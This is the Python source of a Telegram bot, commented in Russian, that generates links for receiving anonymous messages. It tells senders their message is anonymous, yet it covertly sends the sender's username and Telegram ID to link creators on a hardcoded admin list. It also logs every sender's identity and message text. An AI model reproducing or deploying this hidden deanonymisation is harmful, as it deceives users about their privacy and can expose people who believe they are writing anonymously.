import os
import telebot
from telebot import types
from dotenv import load_dotenv
import random
import string
from datetime import datetime

load_dotenv()

TOKEN = os.getenv('BOT_TOKEN')
if not TOKEN:
    raise ValueError("BOT_TOKEN не найден! Добавьте переменную окружения BOT_TOKEN в Railway")

bot = telebot.TeleBot(TOKEN)

# Список администраторов, которые видят отправителя
ADMINS = ['mkhakhanashvili', 'blanecm', 'owqkqmqqmmaq']
ADMIN_IDS = [8379920825]  # ID администраторов

# Хранилище ссылок: {user_id: unique_code}
user_links = {}
# Обратное хранилище: {unique_code: user_id}
link_to_user = {}
# Состояние пользователей: {user_id: creator_id}
user_states = {}

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    
    log(f"START: Пользователь {username} (ID: {user_id}) запустил бота")
    
    # Проверяем, есть ли параметр (переход по ссылке)
    if len(message.text.split()) > 1:
        code = message.text.split()[1]
        if code in link_to_user:
            creator_id = link_to_user[code]
            user_states[user_id] = creator_id
            log(f"ПЕРЕХОД ПО ССЫЛКЕ: {username} (ID: {user_id}) перешел по ссылке с кодом {code}, создатель ID: {creator_id}")
            bot.reply_to(message, 
                "✉️ Напишите ваше анонимное сообщение.\n"
                "Оно будет отправлено создателю ссылки."
            )
            return
    
    # Обычный старт - показываем кнопку
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("🔗 Создать ссылку для анон сообщений", callback_data='create_link')
    markup.add(btn)
    
    bot.send_message(
        message.chat.id,
        "👋 Привет! Создай ссылку для получения анонимных сообщений.",
        reply_markup=markup
    )

def log(message):
    """Логирование с временной меткой"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")

def generate_random_code():
    """Генерирует случайный код из букв и цифр"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))

@bot.callback_query_handler(func=lambda call: call.data == 'create_link')
def create_link(call):
    user_id = call.from_user.id
    username = f"@{call.from_user.username}" if call.from_user.username else call.from_user.first_name
    
    # Генерируем случайный уникальный код
    code = generate_random_code()
    # Проверяем, что код уникален
    while code in link_to_user:
        code = generate_random_code()
    
    user_links[user_id] = code
    link_to_user[code] = user_id
    
    bot_username = bot.get_me().username
    link = f"https://t.me/{bot_username}?start={code}"
    
    log(f"СОЗДАНИЕ ССЫЛКИ: {username} (ID: {user_id}) создал ссылку с кодом {code}")
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=f"✅ Ваша ссылка создана!\n\n"
             f"🔗 {link}\n\n"
             f"Отправьте эту ссылку людям, и они смогут отправить вам анонимное сообщение."
    )
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    
    # Проверяем, отправляет ли пользователь анонимное сообщение
    if user_id in user_states:
        creator_id = user_states[user_id]
        message_text = message.text
        
        # Получаем информацию об отправителе
        sender = message.from_user
        sender_info = f"@{sender.username}" if sender.username else f"{sender.first_name}"
        if sender.last_name:
            sender_info += f" {sender.last_name}"
        
        log(f"ОТПРАВКА СООБЩЕНИЯ: {sender_info} (ID: {user_id}) отправил сообщение создателю (ID: {creator_id})")
        log(f"ТЕКСТ СООБЩЕНИЯ: {message_text[:100]}{'...' if len(message_text) > 100 else ''}")
        
        # Отправляем сообщение создателю ссылки
        try:
            # Первое сообщение - уведомление с текстом
            bot.send_message(
                creator_id,
                f"📩 У тебя новое анонимное сообщение!\n\n{message_text}"
            )
            
            # Проверяем, является ли создатель ссылки администратором
            creator_username = None
            try:
                creator_info = bot.get_chat(creator_id)
                creator_username = creator_info.username
            except:
                pass
            
            # Второе сообщение - кто писал (только для админов)
            is_admin = creator_id in ADMIN_IDS or (creator_username and creator_username in ADMINS)
            
            if is_admin:
                bot.send_message(
                    creator_id,
                    f"От: {sender_info} (ID: {user_id})"
                )
                log(f"ИНФО ОТПРАВИТЕЛЯ: Создатель @{creator_username} (ID: {creator_id}) является админом, отправлена информация об отправителе")
            else:
                log(f"АНОНИМНОСТЬ: Создатель (ID: {creator_id}, username: @{creator_username}) не является админом, информация об отправителе скрыта")
            
            bot.reply_to(message, "✅ Ваше сообщение отправлено!")
            log(f"УСПЕХ: Сообщение успешно доставлено")
        except Exception as e:
            log(f"ОШИБКА: Не удалось отправить сообщение - {e}")
            bot.reply_to(message, "❌ Ошибка отправки сообщения.")
        
        # Очищаем состояние
        del user_states[user_id]
    else:
        bot.reply_to(message, "Используйте /start для начала работы.")

if __name__ == '__main__':
    log("=" * 60)
    log("БОТ ЗАПУЩЕН!")
    log("=" * 60)
    bot.infinity_polling()
